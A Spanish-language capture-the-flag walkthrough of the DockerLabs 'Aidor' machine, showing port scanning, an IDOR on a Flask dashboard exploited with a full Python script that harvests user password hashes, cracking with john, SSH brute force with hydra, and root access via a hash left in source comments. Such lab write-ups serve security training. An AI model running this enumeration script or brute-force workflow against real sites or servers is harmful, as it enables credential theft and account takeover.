---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Aidor DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip aidor.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh aidor.tar
```

Info:

```
                          ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				    

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 15:03 CET
Nmap scan report for 172.17.0.2
Host is up (0.000048s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.13.5)
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Werkzeug/3.1.3 Python/3.13.5
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```

Veremos que contiene una pagina web dentro del puerto `5000`, si entramos dentro veremos un `login`, pero no tenemos credenciales, si observamos abajo veremos que podremos registrar una cuenta, por lo que vamos a registrarla.

Una vez creada una cuenta, iniciaremos sesion y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-23 124818.png" alt=""><figcaption></figcaption></figure>

Veremos un `dashboard` nuestro de la pagina web, pero si observamos un poco mas abajo, veremos que se nos esta identificando por un `ID`, en mi caso el `55`.

Si vemos en la `URL` veremos que se le pasa un `ID` para mostrar la informacion del usuario por ello:

```
URL = http://<IP>:5000/dashboard?id=55
```

Vamos a probar a cambiar el `ID` por otro cualquiera por debajo del nuestro.

Vemos que si lo cambiamos por ejemplo al `50`, nos mostrara esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-23 125021.png" alt=""><figcaption></figcaption></figure>

Nos esta mostrando la informacion del usuario con dicho `ID` y sobre todo lo mas interesante nos muestra el `hash` de la contraseña de dicho usuario, vamos a montarnos un script, para extraer los `hashes` de los usuarios por debajo del numero `54` hasta el `0` y posteriormente probar a `crackearlas`.

## Extraer información por IDOR

> findUsers.py

```python
import requests
from bs4 import BeautifulSoup
import re
import time

def extract_user_info_from_html(html_content):
    """
    Extrae el nombre de usuario y el hash de contraseña del HTML
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Extraer nombre de usuario
    username = None
    welcome_header = soup.find('h2', string=re.compile('Bienvenido,'))
    if welcome_header:
        username_text = welcome_header.get_text()
        username = username_text.replace('Bienvenido,', '').strip()
    
    # Extraer hash de contraseña
    password_hash = None
    password_hash_div = soup.find('div', class_='password-hash')
    if password_hash_div:
        password_hash = password_hash_div.get_text(strip=True)
    
    return username, password_hash

def fetch_user_data(base_url, user_id):
    """
    Obtiene los datos del usuario para un ID específico
    """
    try:
        url = f"{base_url}?id={user_id}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            username, password_hash = extract_user_info_from_html(response.text)
            
            if username and password_hash:
                print(f"[+] ID {user_id}: Encontrado - {username}:{password_hash}")
                return username, password_hash
            else:
                print(f"[-] ID {user_id}: No se pudieron extraer todos los datos")
                return None, None
        else:
            print(f"[-] ID {user_id}: Error HTTP {response.status_code}")
            return None, None
            
    except requests.RequestException as e:
        print(f"[-] ID {user_id}: Error de conexión - {e}")
        return None, None

def main():
    base_url = "http://172.17.0.2:5000/dashboard"
    output_file = "users_hashes.txt"
    
    print("Iniciando extracción de usuarios y hashes...")
    print("=" * 50)
    
    users_found = 0
    
    with open(output_file, 'w') as f:
        for user_id in range(0, 55):  # Del 0 al 54
            username, password_hash = fetch_user_data(base_url, user_id)
            
            if username and password_hash:
                f.write(f"{username}:{password_hash}\n")
                users_found += 1
            
            # Pequeña pausa para no sobrecargar el servidor
            time.sleep(0.1)
    
    print("=" * 50)
    print(f"Extracción completada. Se encontraron {users_found} usuarios.")
    print(f"Los datos se guardaron en: {output_file}")
    
    # Mostrar preview del archivo
    print("\nPreview del archivo:")
    print("-" * 30)
    try:
        with open(output_file, 'r') as f:
            lines = f.readlines()
            for line in lines[:5]:  # Mostrar primeros 5 registros
                print(line.strip())
        if len(lines) > 5:
            print("...")
    except FileNotFoundError:
        print("No se pudo leer el archivo de salida")

if __name__ == "__main__":
    main()
```

Vamos a utilizarla de esta forma:

```shell
python3 -m venv .venv
source .venv/bin/activate
pip3 install requests beautifulsoup4
python3 findUsers.py
```

Info:

```
Iniciando extracción de usuarios y hashes...
==================================================
[-] ID 0: No se pudieron extraer todos los datos
[-] ID 1: No se pudieron extraer todos los datos
[-] ID 2: No se pudieron extraer todos los datos
[+] ID 3: Encontrado - juan.perez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 4: Encontrado - maria.garcia:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 5: Encontrado - carlos.lopez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 6: Encontrado - ana.martinez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 7: Encontrado - luis.rodriguez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 8: Encontrado - laura.gonzalez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 9: Encontrado - miguel.hernandez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 10: Encontrado - isabel.diaz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 11: Encontrado - javier.sanchez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 12: Encontrado - elena.fernandez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 13: Encontrado - david.moreno:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 14: Encontrado - carmen.romero:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 15: Encontrado - francisco.alvarez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 16: Encontrado - patricia.gomez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 17: Encontrado - antonio.molina:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 18: Encontrado - rocio.ortiz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 19: Encontrado - jose.serrano:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 20: Encontrado - teresa.marin:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 21: Encontrado - alejandro.navarro:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 22: Encontrado - silvia.torres:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 23: Encontrado - rafael.dominguez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 24: Encontrado - monica.ramirez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 25: Encontrado - pedro.castro:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 26: Encontrado - natalia.ortega:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 27: Encontrado - admin:d033e22ae348aeb5660fc2140aec35850c4da997
[+] ID 28: Encontrado - sergio.vazquez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 29: Encontrado - beatriz.iglesias:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 30: Encontrado - victor.morales:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 31: Encontrado - clara.santos:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 32: Encontrado - angel.cortes:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 33: Encontrado - lucia.guerrero:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 34: Encontrado - oscar.flores:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 35: Encontrado - irene.medina:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 36: Encontrado - ruben.suarez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 37: Encontrado - veronica.delgado:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 38: Encontrado - manuel.herrera:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 39: Encontrado - eva.mendez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 40: Encontrado - alberto.cruz:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 41: Encontrado - celia.aguilar:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 42: Encontrado - daniel.vidal:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 43: Encontrado - marina.prieto:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 44: Encontrado - adrian.campos:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 45: Encontrado - sandra.leon:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 46: Encontrado - marcos.rivera:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 47: Encontrado - lorena.arias:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 48: Encontrado - jordi.pascual:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 49: Encontrado - noelia.benitez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 50: Encontrado - guillermo.vicente:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 51: Encontrado - raquel.mora:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
[+] ID 52: Encontrado - pingu:dd0284ae23bfe3ed87de34568afa73e03380b7990fcb69b2d11cc902eb1060a3
[+] ID 53: Encontrado - pepe:7c9e7c1494b2684ab7c19d6aff737e460fa9e98d5a234da1310c97ddf5691834
[+] ID 54: Encontrado - aidor:7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35
==================================================
Extracción completada. Se encontraron 52 usuarios.
Los datos se guardaron en: users_hashes.txt

Preview del archivo:
------------------------------
juan.perez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
maria.garcia:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
carlos.lopez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
ana.martinez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
luis.rodriguez:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
...
```

Ahora si leemos el archivo llamado `users_hashes.txt` que se nos ha generado preparado con el formato para `crackearlo` con `john` veremos que ha funcionado, por lo que vamos a probar a ver cuales se pueden `crackear`.

## Escalate user aidor

### Crack password

```shell
john --format=Raw-SHA256 --wordlist=<WORDLIST> users_hashes.txt
```

Info:

```
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (juan.perez)
chocolate        (aidor)
pingu            (pingu)
pepe             (pepe)
4g 0:00:00:00 DONE (2025-11-23 15:17) 66.66g/s 2184Kp/s 2184Kc/s 8738KC/s 123456..kovacs
Warning: passwords printed above might not be all those cracked
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

Vemos que hemos encontrado varias credenciales, por lo que vamos a crear un `users.txt` y un `passwords.txt` para lanzar fuerza bruta por `SSH`.

> users.txt

```
juan.perez
aidor
pingu
pepe
```

> passwords.txt

```
password
chocolate
pingu
pepe
```

Ahora vamos a utilizar `hydra`...

```shell
hydra -L users.txt -P passwords.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-23 15:19:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: aidor   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-23 15:20:01
```

Veremos que ha funcionado las credenciales del usuario `aidor`, por lo que nos conectaremos por `SSH` de esta forma:

### Conexión SSH

```shell
ssh aidor@<IP>
```

Metemos como contraseña `chocolate`...

```
Linux 8d652519153d 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
aidor@8d652519153d:~$ whoami
aidor
```

## Escalate Privileges

Si listamos la carpeta del `/home` directamente...

```shell
ls -la /home
```

Info:

```
total 52
drwxr-xr-x 1 root  root   4096 Nov 23 14:05 .
drwxr-xr-x 1 root  root   4096 Nov 23 14:03 ..
drwx------ 2 aidor aidor  4096 Nov 17 14:56 aidor
-rw-r--r-- 1 root  root   4862 Nov 17 14:59 app.py
-rw-r--r-- 1 root  root  24576 Nov 23 14:05 database.db
drwxr-xr-x 2 root  root   4096 Nov 17 14:52 templates
```

Veremos que hay un `database.db`, si probamos a entrar con la herramienta de `sqlite3` veremos que funcionara.

```shell
sqlite3 database.db
```

Info:

```
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite>
```

Ahora vamos a listar las `tablas` a ver cuales hay.

```mysql
.tables
```

Info:

```
users
```

Y si investigamos por dentro veremos los `hashes` de los usuarios que ya obtuvimos anteriormente con el script, por lo que no nos interesara mucho.

Pero si leemos el archivo `app.py` veremos un comentario en esta seccion:

```python
.........................<RESTO DE CODIGO>.........................................
# Crear la base de datos y la tabla si no existen
def create_db():
    if not os.path.exists('database.db'):
        conn = get_db()
        cursor = conn.cursor()
        # Crear la tabla de usuarios si no existe
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            email TEXT NOT NULL
        )
        ''')
        # Insertar un usuario de ejemplo si la tabla está vacía
        cursor.execute('SELECT COUNT(*) FROM users')
        count = cursor.fetchone()[0]
        # if count == 0:
        #     cursor.execute('''
        #     INSERT INTO users (username, password, email) VALUES
        #     ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
        #     ''')  # La contraseña "admin" es hash SHA-256
        conn.commit()
        conn.close()
.........................<RESTO DE CODIGO>.........................................
```

Veremos que hay un `hash` del usuario `root` codificado en `MD5` por lo que vamos a probar a `crackearlo` de esta forma:

> hash

```
root:aa87ddc5b4c24406d26ddad771ef44b0
```

Ahora si ejecutamos lo siguiente:

```shell
john --format=Raw-MD5 --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
estrella         (root)
1g 0:00:00:00 DONE (2025-11-23 15:26) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, vamos a probar las credenciales desde la maquina por si fuera la del propio `root`.

```shell
su root
```

Metemos como contraseña `estrella`...

```
root@8d652519153d:/home# whoami
root
```

Con esto veremos que ha funcionado, por lo que ya seremos `root` y nos habremos pasado la maquina.
